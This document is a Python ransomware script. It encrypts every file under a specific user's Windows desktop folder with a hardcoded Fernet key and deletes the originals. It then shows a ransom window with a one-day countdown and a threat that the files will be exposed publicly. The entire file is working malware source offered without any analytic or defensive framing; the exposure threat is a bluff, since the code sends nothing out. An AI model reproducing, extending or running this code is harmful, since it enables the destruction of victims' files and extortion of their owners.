import os
import base64
import time
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox
import threading

HARDCODED_KEY = base64.urlsafe_b64encode(b'IamDecryptionKeyIamDecryptionKey')


def encrypt_file(file_path, key):
    try:
        with open(file_path, "rb") as file:
            file_data = file.read()
        fernet = Fernet(key)
        encrypted_data = fernet.encrypt(file_data)

        encrypted_file_path = file_path + ".enc"
        with open(encrypted_file_path, "wb") as file:
            file.write(encrypted_data)

        os.remove(file_path)

        return encrypted_file_path
    except Exception as e:
        print(f"Error encrypting {file_path}: {e}")
        return None


def encrypt_all_files_on_desktop():
    # Use the specified desktop path
    desktop_path = r"C:\Users\abood\OneDrive\سطح المكتب"
    self_name = os.path.basename(__file__)
    files_encrypted = 0

    for root, dirs, files in os.walk(desktop_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)

            # Skip the script itself
            if self_name in file_name:
                continue

            encrypted_file_path = encrypt_file(file_path, HARDCODED_KEY)
            if encrypted_file_path:
                print(f"Encrypted: {file_path} -> {encrypted_file_path}")
                files_encrypted += 1

    return files_encrypted


def show_ransomware_gui():
    def update_timer():
        remaining_time = 86400  # 1 day in seconds
        while remaining_time > 0:
            mins, secs = divmod(remaining_time, 60)
            hours, mins = divmod(mins, 60)
            timer_label.config(text=f"Time Remaining: {hours:02}:{mins:02}:{secs:02}")
            root.update_idletasks()
            time.sleep(1)
            remaining_time -= 1

        messagebox.showerror("Time's up!", "Your time is over. Files will now be exposed to the public!")
        root.destroy()

    def submit_key():
        entered_key = key_entry.get()
        try:
            if base64.urlsafe_b64encode(entered_key.encode()) == HARDCODED_KEY:
                decrypt_all_files_on_desktop()
                messagebox.showinfo("Success", "Files decrypted successfully!")
                root.destroy()
            else:
                raise ValueError("Invalid key!")
        except Exception as e:
            messagebox.showerror("Error", f"Invalid Key or File Corruption! {e}")

    root = tk.Tk()
    root.title("Oops, your files are encrypted!")

    tk.Label(root, text="Your important files are encrypted!", font=("Helvetica", 16)).pack(pady=10)
    tk.Label(root, text="To recover your files, you must enter the decryption key.", font=("Helvetica", 12)).pack(pady=5)
    tk.Label(root, text="If you fail to provide the key in 1 day, your files will be exposed!", font=("Helvetica", 12), fg="red").pack(pady=5)

    key_entry = tk.Entry(root, width=50, show="*")
    key_entry.pack(pady=10)

    submit_button = tk.Button(root, text="Enter Key", command=submit_key)
    submit_button.pack(pady=10)

    timer_label = tk.Label(root, text="", font=("Helvetica", 14), fg="blue")
    timer_label.pack(pady=20)

    threading.Thread(target=update_timer, daemon=True).start()
    root.mainloop()


def decrypt_file(file_path, key):
    try:
        with open(file_path, "rb") as file:
            encrypted_data = file.read()
        fernet = Fernet(key)
        decrypted_data = fernet.decrypt(encrypted_data)

        original_file_path = file_path.replace(".enc", "")
        with open(original_file_path, "wb") as file:
            file.write(decrypted_data)

        os.remove(file_path)
    except Exception as e:
        print(f"Error decrypting {file_path}: {e}")


def decrypt_all_files_on_desktop():
    desktop_path = r"C:\Users\abood\OneDrive\سطح المكتب"
    for root, dirs, files in os.walk(desktop_path):
        for file_name in files:
            if file_name.endswith(".enc"):
                file_path = os.path.join(root, file_name)
                decrypt_file(file_path, HARDCODED_KEY)


def main():
    files_encrypted = encrypt_all_files_on_desktop()
    if files_encrypted > 0:
        print(f"Successfully encrypted {files_encrypted} file(s) on the desktop.")
        show_ransomware_gui()
    else:
        print("No files found to encrypt on the desktop.")


if __name__ == "__main__":
    main()
